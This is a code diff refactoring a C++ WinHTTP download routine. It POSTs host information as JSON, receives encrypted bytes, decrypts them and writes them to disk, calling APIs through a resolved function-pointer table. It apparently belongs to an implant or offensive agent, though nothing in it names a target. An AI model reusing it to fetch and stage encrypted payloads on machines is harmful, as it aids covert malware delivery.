@@ -14,7 +14,8 @@ namespace System::Http
 			L"",
 			WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
 			WINHTTP_NO_PROXY_NAME,
-			WINHTTP_NO_PROXY_BYPASS, 0
+			WINHTTP_NO_PROXY_BYPASS,
+			0
 		);
 		if (!hSession) {
 			return {hSession, hConnect};
@@ -118,68 +119,73 @@ namespace System::Http
 	}
 
 	// Read response as bytes.
-	std::vector<BYTE> ReadResponseBytes(
-		Procs::PPROCS pProcs,
-		HINTERNET hRequest
-	) {
-		std::vector<BYTE> respBytes;
+	std::vector<BYTE> ReadResponseBytes(Procs::PPROCS pProcs, HINTERNET hRequest) {
+		std::vector<BYTE> bytes;
 
 		DWORD dwSize = 0;
 		DWORD dwDownloaded = 0;
-		BYTE* pBuffer = NULL;
-
 		do
 		{
 			dwSize = 0;
-
-			if (!pProcs->lpWinHttpQueryDataAvailable(hRequest, &dwSize))
+			if (pProcs->lpWinHttpQueryDataAvailable(hRequest, &dwSize))
 			{
-				return respBytes;
+				BYTE* tempBuffer = new BYTE[dwSize+1];
+				if (!tempBuffer)
+				{
+					dwSize = 0;
+				}
+				else
+				{
+					ZeroMemory(tempBuffer, dwSize+1);
+					if (pProcs->lpWinHttpReadData(hRequest, (LPVOID)tempBuffer, dwSize, &dwDownloaded))
+					{
+						// Add to buffer;
+						for (size_t i = 0; i < dwDownloaded; ++i)
+						{
+							bytes.push_back(tempBuffer[i]);
+						}
+					}
+
+					delete [] tempBuffer;
+				}
 			}
-
-			// No more available data.
-			if (!dwSize)
-			{
-				return respBytes;
-			}
-
-			pBuffer = new BYTE[dwSize];
-			if (!pBuffer)
-			{
-				return respBytes;
-			}
-
-			ZeroMemory(pBuffer, dwSize);
-			if (!pProcs->lpWinHttpReadData(
-				hRequest,
-				pBuffer,
-				dwSize,
-				&dwDownloaded
-			)) {
-				delete[] pBuffer;
-				return respBytes;
-			}
-
-			respBytes.insert(respBytes.end(), pBuffer, pBuffer + dwDownloaded);
-
-			delete[] pBuffer;
 		} while (dwSize > 0);
 		
-		return respBytes;
+		return bytes;
 	}
 
-	BOOL WriteResponseData(
+	// Wrapper for send&read&write response data
+	BOOL DownloadFile(
 		Procs::PPROCS pProcs,
-		HINTERNET hRequest,
-		const std::wstring& outFile
+		HINTERNET hConnect,
+		LPCWSTR lpHost,
+		INTERNET_PORT nPort,
+		LPCWSTR lpPath,
+		LPCWSTR lpHeaders,
+		const std::wstring& wInfoJSON,
+		const std::wstring& wDest
 	) {
-		DWORD dwSize = 0;
-		DWORD dwRead = 0;
-		LPSTR pszOutBuffer;
+		std::string sInfoJSON = Utils::Convert::UTF8Encode(wInfoJSON);
+
+		WinHttpResponse resp = SendRequest(
+			pProcs,
+			hConnect,
+			lpHost,
+			nPort,
+			lpPath,
+			L"POST",
+			lpHeaders,
+			(LPVOID)sInfoJSON.c_str(),
+			(DWORD)strlen(sInfoJSON.c_str())
+		);
+		if (!resp.bResult || resp.dwStatusCode != 200)
+		{
+			return FALSE;
+		}
 
 		// std::ofstream outFile(sFile, std::ios::binary);
 		HANDLE hFile = CreateFileW(
-			outFile.c_str(),
+			wDest.c_str(),
 			GENERIC_WRITE,
 			0,
 			NULL,
@@ -192,82 +198,26 @@ namespace System::Http
 			return FALSE;
 		}
 
-		do
-		{
-			if (!pProcs->lpWinHttpQueryDataAvailable(hRequest, &dwSize))
-			{
-				break;
-			}
-			if (!dwSize)
-			{
-				break;
-			}
-
-			pszOutBuffer = new char[dwSize+1];
-			if (!pszOutBuffer)
-			{
-				break;
-			}
-
-			// Read the data
-			ZeroMemory(pszOutBuffer, dwSize+1);
-			if (!pProcs->lpWinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwRead))
-			{
-				// Could not read data.
-			}
-			else
-			{
-				DWORD dwWritten;
-				if (!WriteFile(hFile, pszOutBuffer, dwRead, &dwWritten, NULL))
-				{
-					return FALSE;
-				}
-			}
-
-			delete [] pszOutBuffer;
-
-			if (!dwRead)
-				break;
-		} while (dwSize > 0);
-
-		// outFile.close();
-		CloseHandle(hFile);
-
-		return TRUE;
-	}
-
-	// Wrapper for send&read&write response data
-	BOOL DownloadFile(
-		Procs::PPROCS pProcs,
-		HINTERNET hConnect,
-		LPCWSTR lpHost,
-		INTERNET_PORT nPort,
-		LPCWSTR lpPath,
-		const std::wstring& wSrc,
-		const std::wstring& wDest
-	) {
-		std::string sSrc = Utils::Convert::UTF8Encode(wSrc);
-
-		WinHttpResponse resp = SendRequest(
-			pProcs,
-			hConnect,
-			lpHost,
-			nPort,
-			lpPath,
-			L"POST",
-			L"",
-			(LPVOID)sSrc.c_str(),
-			(DWORD)strlen(sSrc.c_str())
-		);
-		if (!resp.bResult || resp.dwStatusCode != 200)
-		{
-			return {};
-		}
-
-		if (!WriteResponseData(pProcs, resp.hRequest, wDest))
+		// Read file
+		std::vector<BYTE> bytes = ReadResponseBytes(pProcs, resp.hRequest);
+		if (bytes.size() == 0)
 		{
 			return FALSE;
 		}
+
+		// Decrypt data
+		std::vector<BYTE> decBytes = Crypt::DecryptData(Utils::Convert::VecByteToString(bytes));
+		
+		// Write data to file
+		DWORD dwWritten;
+		if (!WriteFile(hFile, decBytes.data(), decBytes.size(), &dwWritten, NULL))
+		{
+			CloseHandle(hFile);
+			return FALSE;
+		}
+
+		// outFile.close();
+		CloseHandle(hFile);
 
 		return TRUE;
 	}
